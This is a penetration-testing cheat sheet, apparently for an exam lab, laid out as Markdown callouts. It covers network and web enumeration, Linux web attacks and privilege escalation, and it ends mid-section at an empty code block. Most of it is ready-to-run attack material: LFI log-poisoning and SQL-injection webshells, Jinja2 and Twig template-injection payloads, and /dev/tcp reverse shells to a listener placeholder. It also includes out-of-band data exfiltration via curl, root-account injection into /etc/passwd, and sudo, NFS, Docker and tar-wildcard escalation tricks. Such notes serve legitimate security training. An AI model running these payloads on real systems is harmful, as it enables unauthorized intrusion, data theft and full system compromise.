# UNIVERSAL ENUMERATION FRAMEWORK

## Initial Recon — Run in Parallel Immediately

> [!abstract] 🐧 Linux Bash: Initialize Local Workspace Architecture
> 
> Creates a clean, structured folder layout to isolate scan outputs, extracted credentials, exploit scripts, and reporting evidence per machine.
> 
> Bash
> 
> Bash
> 
> ```
> mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}
> ```

> [!check] 🐧 Linux Bash: Parallel Quick Target Service Mapping
> 
> Performs a backgrounded initial port check across multiple targets simultaneously to map out responsive systems without waiting sequentially.
> 
> Bash
> 
> Bash
> 
> ```
> for ip in <MS01_IP> <MS02_IP> <DC_IP> <BOX1_IP> <BOX2_IP> <BOX3_IP>; do
>      nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &
> done
> wait
> ```

> [!info] 🐧 Linux Bash: Full TCP Port Scan per Machine
> 
> Thoroughly sweeps the entire TCP keyspace (all 65,535 ports) with default script probing and software version fingerprinting.
> 
> Bash
> 
> Bash
> 
> ```
> nmap -p- -sV -sC --open -T4 <TARGET_IP> -oN full_tcp.txt
> ```

> [!warning] 🐧 Linux Bash: Top 20 UDP Ports Scan
> 
> Audits critical stateless network protocols (such as DNS, SNMP, and TFTP) that are frequently missed by standard TCP testing.
> 
> Bash
> 
> Bash
> 
> ```
> nmap -sU --top-ports 20 <TARGET_IP> -oN udp.txt
> ```

## Port ➔ Action Decision Tree

> [!quote] 🌳 Mappings: Protocol-to-Action Blueprint Matrix
> 
> Quick reference roadmap mapping open ports directly to their respective deep enumeration tools and unauthenticated test flows.
> 
> Plaintext
> 
> ```
> PORT    SERVICE     → IMMEDIATE ACTION
> ────────────────────────────────────────────────────────────────
> 21      FTP         → ftp <IP> (try anonymous:anonymous)
>                       Check permissions (read/write); banner version → searchsploit
> 22      SSH         → Note version; investigate algorithms; use credentials found downstream
>                       Exposed files check? ssh -i id_rsa user@<IP> (ensure chmod 600)
> 23      Telnet      → telnet <IP>; test default/administrative combinations
> 25      SMTP        → smtp-user-enum -M VRFY -U users.txt -t <IP>
>                       Check open relay status via telnet; search version bugs
> 53      DNS         → dig axfr @<IP> <domain>; dnsenum --dnsserver <IP> <domain>
>                       dnsrecon -d <domain> -t axfr (verify zone transfers)
> 80/443  HTTP/S      → [SEE WEB ENUMERATION WORKFLOW BELOW]
> 88      Kerberos    → AD verified! Check user validation via blind pre-auth (kerbrute)
> 111     RPC/NFS     → showmount -e <IP>; mount -t nfs <IP>:/share /mnt/nfs -o nolock
> 135     MSRPC       → Windows core system; rpcclient -U "" -N <IP> (null session check)
> 139/445 SMB         → [SEE SMB ENUMERATION BELOW]
> 161     SNMP UDP    → snmpwalk -c public -v2c <IP>; snmp-check <IP> -c public
>                       onesixtyone -c community_strings.txt <IP>
> 389/636 LDAP        → ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"
>                       Verify anonymous binds; extract schema, user descriptions, naming contexts
> 1433    MSSQL       → [SEE MSSQL SECTION]
> 3306    MySQL       → mysql -u root -h <IP> (check for empty/blank password)
> 3389    RDP         → Check NLA status, check BlueKeep; execute creds later via xfreerdp
> 4444+   Custom      → nc -nv <IP> <PORT>; execute banner grabbing; research software string
> 5985    WinRM       → evil-winrm -i <IP> -u user -p pass (or pass-the-hash with -H)
> 8080    Alt-HTTP    → Inspect application manager panels (/manager/html, /admin)
> 8443    Alt-HTTPS   → Check SSL/TLS certificate fields for hidden subdomains/hostnames
> ```

## Web Enumeration Workflow

> [!info] 🐧 Linux Bash: Tech Fingerprint & Response Headers Identification
> 
> Inspects the web server response headers and digital signature footprints to map out the underlying software, frameworks, and deployment languages.
> 
> Bash
> 
> Bash
> 
> ```
> whatweb http://<TARGET_IP> -v
> curl -IL http://<TARGET_IP>
> ```

> [!info] 🐧 Linux Bash: Automated Web Server Vulnerability Scan
> 
> Scans the web path for legacy configuration files, insecure HTTP methods, out-of-date scripts, and server deployment vulnerabilities.
> 
> Bash
> 
> Bash
> 
> ```
> nikto -h http://<TARGET_IP> -output nikto.txt &
> ```

> [!check] 🐧 Linux Bash: Large-Scale Directory Web-Content Brute Force
> 
> Launches a targeted high-velocity directory search using defined script extensions to discover hidden administrative endpoints.
> 
> Bash
> 
> Bash
> 
> ```
> gobuster dir -u http://<TARGET_IP> \
>      -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
>      -x php,html,txt,asp,aspx,jsp,do,py -t 50 -o gobuster.txt
> ```

> [!check] 🐧 Linux Bash: Advanced Recursive Multi-Threaded Content Brute Force
> 
> Recursively explores discovering structures up to three layers deep, building a live directory tree map of the hidden attack surface.
> 
> Bash
> 
> Bash
> 
> ```
> feroxbuster -u http://<TARGET_IP> \
>      -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
>      -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt
> ```

> [!note] 🐧 Linux Bash: Sensitive Endpoints & Hardcoded Credentials Manual Checking
> 
> Directly queries common paths known to leak infrastructure variables, development repositories, and plaintext configuration secrets.
> 
> Bash
> 
> Bash
> 
> ```
> curl -s http://<TARGET_IP>/robots.txt
> curl -s -I http://<TARGET_IP>/.git/HEAD   # Identifies exposed local Git repository
> curl -s http://<TARGET_IP>/.env            # Extracts raw environmental variables
> curl -s -I http://<TARGET_IP>/backup/      # Identifies backup archive storage locations
> curl -s http://<TARGET_IP>/config.php      # Inspects configuration files directly
> curl -s http://<TARGET_IP>/.htaccess       # Evaluates directory rule overrides
> ```

> [!note] 🌐 Browser: Page Comments & Inline Source Inspection Check
> 
> Review source code directly to locate hardcoded developer remarks, configuration hints, or hidden testing passwords left inside comments.
> 
> Plaintext
> 
> ```
> view-source:http://<TARGET_IP>/           # Inspect HTML comments for credentials
> ```

> [!check] 🐧 Linux Bash: Virtual Host & Subdomain Identity Spraying
> 
> Fuzzes the HTTP Host Header to identify virtual host maps that exist within the server configuration without public DNS records.
> 
> Bash
> 
> Bash
> 
> ```
> gobuster vhost -u http://<DOMAIN> \
>      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
>      --append-domain -t 50 -o vhosts.txt
> ```

> [!check] 🐧 Linux Bash: Automated WordPress Core & Installed Plugins Audit
> 
> Executes deep component tracking on WordPress structures to identify vulnerable plugins, active themes, and valid username handles.
> 
> Bash
> 
> Bash
> 
> ```
> wpscan --url http://<TARGET_IP> --enumerate u,p,t,cb,dbe --plugins-detection aggressive
> ```

> [!check] 🐧 Linux Bash: Automated Joomla CMS Structure Scan
> 
> Maps out the administrative infrastructure, component dependencies, and unpatched core modules on identified Joomla sites.
> 
> Bash
> 
> Bash
> 
> ```
> joomscan -u http://<TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Automated Drupal CMS Architecture Tracker
> 
> Tracks Drupal themes, active system libraries, version configurations, and known modular exploit vectors.
> 
> Bash
> 
> Bash
> 
> ```
> droopescan scan drupal -u http://<TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Web Request Parameter Fuzzing for Vulnerability Detection
> 
> Fuzzes input fields to discover hidden parameters vulnerable to Local File Inclusion (LFI) or injection strings.
> 
> Bash
> 
> Bash
> 
> ```
> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
>      -u "http://<TARGET_IP>/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500
> ```

## SMB Enumeration

> [!info] 🐧 Linux Bash: Unauthenticated baseline Null Session Check
> 
> Verifies if the remote SMB server permits blank authentication connections to establish an initial information mapping layer.
> 
> Bash
> 
> Bash
> 
> ```
> smbclient -L //<TARGET_IP> -N
> ```

> [!info] 🐧 Linux Bash: Null Session Share Mapping Access Permissions Check
> 
> Generates a comprehensive view detailing read/write access controls across all visible shares under an unauthenticated profile.
> 
> Bash
> 
> Bash
> 
> ```
> smbmap -H <TARGET_IP> -u '' -p ''
> ```

> [!check] 🐧 Linux Bash: Unauthenticated Null Session Domain Reconnaissance Modules
> 
> Queries domain parameters, share states, and system metadata over SMB via null login pathways.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u '' -p '' --shares
> ```

> [!check] 🐧 Linux Bash: Guest User Account Authorization Permissions Scan
> 
> Evaluates if standard Windows built-in Guest accounts are left active and open to wider structural network access.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u 'guest' -p '' --shares
> ```

> [!warning] 🐧 Linux Bash: Scripted SMB Engine Common Security Weakness Scans
> 
> Runs the Nmap Scripting Engine collection against port 445 to safely test for architectural vulnerabilities and configuration faults.
> 
> Bash
> 
> Bash
> 
> ```
> nmap --script smb-vuln* -p 445 <TARGET_IP>
> ```

> [!warning] 🐧 Linux Bash: Targeted Legacy Core Memory Corruption Check (MS17-010)
> 
> Explicitly checks the network interface for critical transactional memory corruption bugs matching the EternalBlue exploit profile.
> 
> Bash
> 
> Bash
> 
> ```
> nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Authenticated Domain Objects, Policy, & Shares Discovery
> 
> Automatically extracts domain user lists, network groups, active privileges, password rules, and structural shares using valid low-privilege accounts.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u user -p pass --shares --users --groups --pass-pol
> ```

> [!info] 🐧 Linux Bash: Recursive Listing of Writable Target Shares Partitions
> 
> Recursively maps all directory paths and subfiles matching access levels held by the testing account context.
> 
> Bash
> 
> Bash
> 
> ```
> smbmap -H <TARGET_IP> -u user -p pass -R
> ```

> [!info] 🐧 Linux Bash: Manual Interactive Authenticated Share Drive Connection
> 
> Drops into a semi-interactive SMB CLI shell partition to navigate folders, read text, or upload staging files.
> 
> Bash
> 
> Bash
> 
> ```
> smbclient //<TARGET_IP>/share -U 'user%pass'
> ```

> [!note] 🐧 Linux Bash: Recursive Mass Extraction and Download of Share Contents
> 
> Automatically disables confirmations to recursively mirror and download the complete contents of an entire remote share onto the local system.
> 
> Bash
> 
> Bash
> 
> ```
> smbclient //<TARGET_IP>/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
> ```

> [!check] 🐧 Linux Bash: Spidering Shared Files for Hardcoded Configuration Strings
> 
> Spiders files across shares matching metadata types to extract embedded passwords, developer tokens, or database configuration text strings.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
> ```

## SNMP Enumeration

> [!check] 🐧 Linux Bash: Community String Dictionary Bruteforce Scan
> 
> Tests a wordlist of community strings against port 161 UDP to break authentication filters on standard device dashboards.
> 
> Bash
> 
> Bash
> 
> ```
> onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>
> ```

> [!info] 🐧 Linux Bash: Full MIB Sub-Tree Walk (SNMPv1 Profile Endpoint)
> 
> Dumps the complete accessible Management Information Base tree array containing critical network, system, and hardware variables.
> 
> Bash
> 
> Bash
> 
> ```
> snmpwalk -c public -v1 <TARGET_IP>
> ```

> [!info] 🐧 Linux Bash: OID Active Process Space Extraction Tree Scan
> 
> Queries the explicit Object Identifier tree that maps currently executing application paths and active system processes on the host.
> 
> Bash
> 
> Bash
> 
> ```
> snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2   # Running processes OID
> ```

> [!info] 🐧 Linux Bash: OID Installed Software Application Inventory Scan
> 
> Extracts the baseline list detailing all installed packages, updates, and applications tracked within the system engine.
> 
> Bash
> 
> Bash
> 
> ```
> snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2   # Installed software OID
> ```

> [!info] 🐧 Linux Bash: OID Windows Domain System Accounts Collection
> 
> Harvests valid local or domain user account tables exposed through legacy network tracking objects.
> 
> Bash
> 
> Bash
> 
> ```
> snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.4.1.77.1.2.25    # Windows accounts OID
> ```

> [!check] 🐧 Linux Bash: Scripted Engine Configuration Report Mapping
> 
> Formats and outputs system architecture parameters, active network interfaces, routing logs, and configuration matrices into a single baseline report.
> 
> Bash
> 
> Bash
> 
> ```
> snmp-check <TARGET_IP> -c public
> ```

# STANDALONE LINUX BOX METHODOLOGY

## Decision Tree — Linux Initial Access

> [!abstract] 🌳 Logic Diagram: Linux System Assessment Entry Path Blueprint
> 
> Flow structure for processing open Linux services from port identification to operational remote code execution.
> 
> Plaintext
> 
> ```
> NMAP OUTPUT ANALYSIS
> │
> ├── Web Port (80/443/8080)?
> │   ├── Directory enum → /admin, /backup, /upload, /dev found?
> │   ├── CMS? → WPScan/Joomscan → plugin CVE / auth bypass
> │   ├── Login page? → default creds, SQLi, brute force
> │   ├── File upload? → bypass constraints → webshell
> │   ├── LFI/RFI? → log poisoning or wrapper execution → RCE
> │   ├── SSTI? → Jinja2/Twig structural sandbox breakout → RCE
> │   ├── SQLi? → arbitrary system file write → webshell
> │   ├── Command injection in params? Chaining characters (;, |, `)
> │   └── Version-specific CVE? → searchsploit / public PoC tracking
> │
> ├── FTP (21)?
> │   ├── Anonymous login → identify writable directories overlapping with webroot
> │   └── Upload PHP shell → trigger execution via web browser navigation
> │
> ├── SSH (22)? → Need creds; prioritize passive extraction and credential hunting on other services
> │
> ├── NFS (111/2049)?
> │   └── showmount -e → mount exported share → check for .ssh files, hardcoded creds, writable paths
> │
> └── SNMP (161 UDP)?
>      └── community string validation → dump infrastructure parameters → extract credentials/usernames
> ```

## Linux Web Attack Techniques

> [!example] 🌐 URL Ingress: Arbitrary File System Traversal Verification
> 
> Tests inputs for path traversal vulnerabilities to read system configuration databases or process memory maps.
> 
> Plaintext
> 
> ```
> http://<TARGET_IP>/page.php?file=../../../../etc/passwd
> http://<TARGET_IP>/page.php?file=../../../../etc/shadow    # Tests for misconfigured file permissions
> http://<TARGET_IP>/page.php?file=/proc/self/environ      # Extracts in-memory environment properties
> ```

> [!example] 🌐 URL Ingress: Base64 Decoded PHP Filter Source Code Disclosures
> 
> Bypasses server-side rendering to force the engine to convert raw PHP source code files into cleartext base64 strings instead of executing them.
> 
> Plaintext
> 
> ```
> http://<TARGET_IP>/page.php?file=php://filter/convert.base64-encode/resource=config.php
> ```

> [!example] 🌐 URL Ingress: Execution of Arbitrary In-Memory PHP Payload Wrappers
> 
> Uses inline data URIs to stream code payloads straight into the execution engine when file inclusion configurations allow.
> 
> Plaintext
> 
> ```
> http://<TARGET_IP>/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
> ```

> [!example] 🐧 Linux Bash: Apache/Nginx Web Log Poisoning via User-Agent String Injections
> 
> Inject code into the User-Agent field, forcing it into access log files to build an execution gateway through file inclusion.
> 
> Bash
> 
> Bash
> 
> ```
> curl -A '<?php system($_GET["cmd"]); ?>' http://<TARGET_IP>/
> ```

> [!example] 🌐 URL Ingress: Executing a Weaponized Local Web Access Log Container
> 
> References the poisoned log container to run arbitrary operating system processes via request parameters.
> 
> Plaintext
> 
> ```
> http://<TARGET_IP>/page.php?file=/var/log/apache2/access.log&cmd=id
> ```

> [!example] 🐧 Linux Bash: SSH Authentication Error Streams In-Memory Log Poisoning
> 
> Inject execution scripts into authentication logs by passing them directly as the username connection string during a failed login attempt.
> 
> Bash
> 
> Bash
> 
> ```
> ssh '<?php system($_GET["cmd"]); ?>'@<TARGET_IP>
> ```

> [!example] 🌐 URL Ingress: Context Verification Execution for Poisoned Secondary Log Channels
> 
> Triggers execution vectors embedded within secure authentication log pathways.
> 
> Plaintext
> 
> ```
> http://<TARGET_IP>/page.php?file=/var/log/auth.log&cmd=whoami
> ```

> [!example] 🌐 URL Ingress: SQL Injection Authentication Bypass Core Triage Test
> 
> Passes basic boolean logic escape strings into entry fields to bypass back-end identity verification logic.
> 
> Plaintext
> 
> ```
> ' OR '1'='1'-- -
> ```

> [!example] 🌐 URL Ingress: Manual SQL Injection Union-Based System File Read Execution
> 
> Uses database engine primitives (`load_file`) within a UNION statement to read internal files from disk.
> 
> Plaintext
> 
> ```
> ' UNION SELECT 1,load_file('/etc/passwd'),3-- -
> ```

> [!example] 🌐 URL Ingress: SQL Injection Backdoor Webshell Delivery via Arbitrary Output Files
> 
> Abuses SQL output operators (`INTO OUTFILE`) to drop an interactive web execution payload straight into the server's public web directory.
> 
> Plaintext
> 
> ```
> ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/cmd.php'-- -
> ```

> [!check] 🐧 Linux Bash: Automated Web Database Injection Exploration and Backdoor Shell Spawning
> 
> Automatically tests injection parameters, maps structural databases, and attempts automated operating system shell transitions.
> 
> Bash
> 
> Bash
> 
> ```
> sqlmap -u "http://<TARGET_IP>/login.php" --data="user=admin&pass=x" --level=5 --risk=3 --dbs
> sqlmap -u "http://<TARGET_IP>/item?id=1" --os-shell   # Attempts direct command execution hook
> ```

> [!check] 🐧 Linux Bash: Automated File System Write Manipulations via SQL Application Weaknesses
> 
> Uses database injection pathways to write staging binaries or scripts directly onto the remote target storage path.
> 
> Bash
> 
> Bash
> 
> ```
> sqlmap -u "http://<TARGET_IP>/item?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
> ```

> [!abstract] 🌳 Markdown List: Arbitrary File Upload Bypass Structural Extensions Checklist
> 
> Standard bypass sequences used to avoid server-side application verification rules on upload parameters.
> 
> Plaintext
> 
> ```
> # 1. MIME type tampering: Modify header Content-Type to match image/jpeg
> # 2. Magic bytes verification prepend: Prepend GIF89a to the script header
> # 3. Double extension mapping: Execute shell.php.jpg or handle trailing breaks like shell.php%00.jpg
> # 4. Case validation shifts: Alter string into shell.pHp or write shell.PHP
> # 5. Alternative execution extensions: Swap filters with .php3, .php4, .php5, .phtml, .phar, .shtml
> # 6. Blacklist rule dropouts: Identify untracked configurations like .php7 or check .inc paths
> # 7. Injected trailing null bytes (Legacy architectures): Force processing dropouts using shell.php%00.gif
> ```

> [!example] 🌐 Template String: Server-Side Template Injection Core Component Detection String Checks
> 
> Evaluates mathematical evaluation outputs inside template engines to isolate specific syntax families and language structures.
> 
> Plaintext
> 
> ```
> {{7*7}}       → Returns 49 = Jinja2 / Twig Engine Profile
> ${7*7}        → Returns 49 = FreeMarker / Mako Architecture Match
> <%= 7*7 %>    → Returns 49 = ERB (Ruby Framework Signature)
> #{7*7}        → Returns 49 = Ruby /超 Structural Pebble Context
> ```

> [!example] 🌐 Template String: Python Jinja2 Engine Native Sandboxed Remote Code Execution Payloads
> 
> Navigates the internal Python class object map via the Jinja2 context to bypass application environments and trigger system popen streams.
> 
> Plaintext
> 
> ```
> {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
> {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
> ```

> [!example] 🌐 Template String: Jinja2 Payload Forcing Reverse Bash Terminal Ingress Streams
> 
> Forces the remote class pool context to open an outbound socket shell channel back to the listener.
> 
> Plaintext
> 
> ```
> {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"').read()}}
> ```

> [!example] 🌐 Template String: Twig Server-Side Template Engine Arbitrary Code Injection Payloads
> 
> Abuses the Twig environment callback filters to register and map underlying system code handlers.
> 
> Plaintext
> 
> ```
> {{['id']|filter('system')}}
> {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
> ```

> [!example] 🌐 URL Ingress: Command Injection Native Operational Parameter Chaining Checks
> 
> Passes basic operational link symbols into parameter strings to force stacked terminal executions alongside legitimate commands.
> 
> Plaintext
> 
> ```
> ping=127.0.0.1; whoami
> ping=127.0.0.1|whoami
> ping=127.0.0.1`whoami`
> ```

> [!example] 🌐 URL Ingress: Out-Of-Bounds (OOB) Cryptographic Command Injection Exfiltration Streams
> 
> Encodes sensitive variables into base64 and exfiltrates them via an outbound web query when direct system output is filtered.
> 
> Plaintext
> 
> ```
> ping=127.0.0.1; curl http://<LHOST>/?x=$(id|base64)
> ```

## Linux Privilege Escalation Checklist

### STEP 1 — AUTOMATED (Always run immediately after getting a shell)

> [!abstract] 🐧 Linux Bash: Attacker Web Delivery Platform Launch Configuration
> 
> Prepares a lightweight HTTP listener within the local repository folder to deliver enumeration utilities.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!check] 🐧 Linux Bash: Piping Remote Inbound System Audit Scripts to Target Executions
> 
> Streams and executes system audit frameworks directly into memory, saving automated verification findings to temporary files.
> 
> Bash
> 
> Bash
> 
> ```
> curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.out
> ```

### STEP 2 — MANUAL CHECKS (Don't skip even after linpeas)

#### ── Context ──────────────────────────────────────────────────

> [!info] 🐧 Linux Bash: Active Session User Token & Machine Identification Configuration
> 
> Validates current user context mapping, structural identity groups, and active network host configurations.
> 
> Bash
> 
> Bash
> 
> ```
> whoami && id && hostname
> ```

> [!info] 🐧 Linux Bash: Kernel Environment & Operating Distribution Version Verification
> 
> Extracts the specific kernel build parameters and OS tracking documentation to identify public kernel vulnerability vectors.
> 
> Bash
> 
> Bash
> 
> ```
> uname -a && cat /etc/os-release
> ```

> [!note] 🐧 Linux Bash: Extracting In-Memory Plaintext Secrets from Environment Arrays
> 
> Searches system global environment states for active developer keys, hardcoded parameters, or service access passwords.
> 
> Bash
> 
> Bash
> 
> ```
> env | grep -i "pass\|key\|secret\|token"
> ```

> [!note] 🐧 Linux Bash: Interrogating User History Trails Containers for Plaintext Passwords
> 
> Reviews file operational histories to harvest passwords entered inline during administrative maintenance routines.
> 
> Bash
> 
> Bash
> 
> ```
> cat ~/.bash_history
> cat /home/*/.bash_history 2>/dev/null
> ```

#### ── Sudo ─────────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Query Authorized Root Sudo Program Mappings
> 
> Lists the explicit application access properties and command allowances granted to the active account profile by the security configuration.
> 
> Bash
> 
> Bash
> 
> ```
> sudo -l
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Interactive Tool Breakouts (GTFObins Find Command Path)
> 
> Abuses permissions on `find` execution tracking flags to trigger a root shell breakout.
> 
> Bash
> 
> Bash
> 
> ```
> sudo find . -exec /bin/bash \; -p
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo In-Memory Program Scripting Escape (GTFObins Python Framework)
> 
> Spawns a root shell process by running inline system commands inside the elevated Python runtime engine.
> 
> Bash
> 
> Bash
> 
> ```
> sudo python3 -c 'import os; os.system("/bin/bash")'
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Local Text Editor Workspace Shell Breakout (GTFObins Vim Core)
> 
> Invokes shell command execution operators directly from the command buffer within an elevated text editor editor interface.
> 
> Bash
> 
> Bash
> 
> ```
> sudo vim → inside session execute: !/bin/bash
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Pattern Parsing Terminal Escalation (GTFObins Awk Integration)
> 
> Bypasses execution restrictions by running system primitives inside the awk initialization blocks.
> 
> Bash
> 
> Bash
> 
> ```
> sudo awk 'BEGIN {system("/bin/bash")}'
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Environment Configuration Passing Shell Breakout
> 
> Drops cleanly into an elevated root environment through direct binary invocation properties.
> 
> Bash
> 
> Bash
> 
> ```
> sudo env /bin/bash
> ```

> [!example] 🐧 Linux Bash: Compiling and Weaponizing Writable Preloaded Shared Library Configurations
> 
> Hijacks pre-execution path resolution rules (`LD_PRELOAD`) to load a custom shared library that grants immediate root access when a sudo command runs.
> 
> Bash
> 
> Bash
> 
> ```
> gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
> sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>
> ```

#### ── SUID/GUID ────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Comprehensive Root SUID and GUID Permissions File Location Queries
> 
> Identifies all files configured to run with elevated root owner permissions regardless of the executing user context.
> 
> Bash
> 
> Bash
> 
> ```
> find / -perm -4000 -type f 2>/dev/null | xargs ls -la
> find / -perm -2000 -type f 2>/dev/null | xargs ls -la
> ```

#### ── Capabilities ────────────────────────────────────────────

> [!check] 🐧 Linux Bash: System Extended File Partition Capability Allocations Search Scan
> 
> Inspects the filesystem to identify binaries configured with granular system privileges (such as `cap_setuid`) outside of traditional SUID controls.
> 
> Bash
> 
> Bash
> 
> ```
> getcap -r / 2>/dev/null
> ```

#### ── Cron Jobs ────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Auditing Automated Daemon Crontab Schedules & Routine Script Scripts
> 
> Examines background cron tables, directory schedules, and automation parameters to find scripts ripe for modification.
> 
> Bash
> 
> Bash
> 
> ```
> cat /etc/crontab
> ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
> crontab -l
> cat /var/spool/cron/crontabs/* 2>/dev/null
> ```

> [!example] 🐧 Linux Bash: Weaponizing Wildcard Expansion Traversal Anomalies inside Tar Automations
> 
> Drops custom flags into a directory processed by automated tar operations to trick the archiver into executing scripts as root.
> 
> Bash
> 
> Bash
> 
> ```
> echo "" > '--checkpoint=1'
> echo "" > '--checkpoint-action=exec=bash shell.sh'
> echo 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1' > shell.sh
> ```

#### ── Services running as root ─────────────────────────────────

> [!check] 🐧 Linux Bash: Identifying Active Daemon Threads Bound to Root Contexts
> 
> Locates privileged systems running on internal loopback interfaces that can be targeted for escalation or port forwarding.
> 
> Bash
> 
> Bash
> 
> ```
> ps aux | grep root | grep -v "\[" | grep -v "kthreadd"
> ss -tlnp   # Maps out active local-only internal services
> ```

#### ── Writable files ──────────────────────────────────────────

> [!check] 🐧 Linux Bash: Searching System Storage Paths for Writable File Vulnerabilities
> 
> Audits storage blocks for insecure file system permissions that permit unprivileged accounts to overwrite configuration libraries or application scripts.
> 
> Bash
> 
> Bash
> 
> ```
> find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -type f 2>/dev/null
> ```

> [!example] 🐧 Linux Bash: Local Root Account Injection via Writable Passwd File Targets
> 
> Injects a custom user with root settings directly into `/etc/passwd` when insecure write permissions are present on the file.
> 
> Bash
> 
> Bash
> 
> ```
> openssl passwd -1 haxpass      # Generates MD5crypt hash string value
> echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
> su hax                         # Authenticates locally with root context
> ```

#### ── NFS no_root_squash ──────────────────────────────────────

> [!check] 🐧 Linux Bash: Auditing Network File System Mount Point Export System Tables
> 
> Evaluates Network File System exports to check for the `no_root_squash` configuration flaw on accessible paths.
> 
> Bash
> 
> Bash
> 
> ```
> cat /etc/exports
> ```

> [!example] 🐧 Linux Bash: Forcing Privilege Escalation over Shared Storage Units (NFS Root Squashing Hijack)
> 
> Mounts an insecure NFS share from the attacker platform to copy a SUID-rigged shell payload straight into the target filesystem.
> 
> Bash
> 
> Bash
> 
> ```
> # Executed on Attacker Machine as Root:
> mkdir /mnt/nfs
> mount -t nfs <TARGET_IP>:/share /mnt/nfs
> cp /bin/bash /mnt/nfs/
> chmod +s /mnt/nfs/bash     # Injects SUID permission state via root context
> ```

> [!example] 🐧 Linux Bash: Initializing the Local SUID Shell Partition on Compromised Victim Terminal
> 
> Runs the uploaded binary path with the persistence override flag to drop directly into a root shell session.
> 
> Bash
> 
> Bash
> 
> ```
> /tmp/bash -p               # Spawns persistent elevated root environment shell
> ```

#### ── Docker ──────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Confirm Containerization Engine Group Identity Status Mapping
> 
> Verifies if the active user profile belongs to the Docker system group to confirm local escalation potential.
> 
> Bash
> 
> Bash
> 
> ```
> id | grep -i docker
> groups | grep -i docker
> ```

> [!example] 🐧 Linux Bash: Breaking Container Sandboxes via Privilege Local Drive Partition Volumes Mounting
> 
> Launches a new container instance that mounts the underlying host filesystem directly to read or write any file with root permissions.
> 
> Bash
> 
> Bash
> 
> ```
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
> ```

#### ── PATH Hijacking ──────────────────────────────────────────

> [!check] 🐧 Linux Bash: Identifying Relative Executable Calls inside Root Scripts Binaries
> 
> Checks privileged binaries to locate naked, non-absolute path definitions that can be hijacked via environment modifications.
> 
> Bash
> 
> Bash
> 
> ```
> strings /usr/local/sbin/rootscript | grep -v "/"
> ```

> [!example] 🐧 Linux Bash: Injecting Malicious Local Executables for Path Redirection Privilege Hijacks
> 
> Creates a malicious script named after the targeted system command and prepends `/tmp` to the local PATH variable to intercept execution.
> 
> Bash
> 
> Bash
> 
> ```
> echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<LHOST>/4444 0>&1' > /tmp/service
> chmod +x /tmp/service
> export PATH=/tmp:$PATH
> ```

#### ── Interesting Files ────────────────────────────────────────

> [!note] 🐧 Linux Bash: Global Document Tree File Search Extensions Tracker
> 
> Searches filesystem blocks for standard configuration targets, database files, backups, and encryption stores.
> 
> Bash
> 
> Bash
> 
> ```
> find / -name "*.conf" -o -name "*.config" -o -name "*.xml" \
>      -o -name "*.ini" -o -name "*.bak" -o -name "*.old" \
>      -o -name "*.zip" -o -name "*.db" -o -name "*.kdbx" \
>      2>/dev/null | grep -v proc | grep -v sys | head -50
> ```

> [!note] 🐧 Linux Bash: Targeted Text File Content Regex Searches for Passwords
> 
> Performs key-term matching across common application directories to extract hardcoded access variables.
> 
> Bash
> 
> Bash
> 
> ```
> grep -r "password\|passwd\|pwd\|secret\|token\|key" \
>      /var/www/html/ /opt/ /home/ /etc/ 2>/dev/null | grep -v ".pyc"
> ```

> [!note] 🐧 Linux Bash: Target Traversal Extraction for SSH Cryptographic Identity Keys
> 
> Searches the filesystem to harvest user private SSH credentials that can be leveraged for persistence or lateral movement.
> 
> Bash
> 
> Bash
> 
> ```
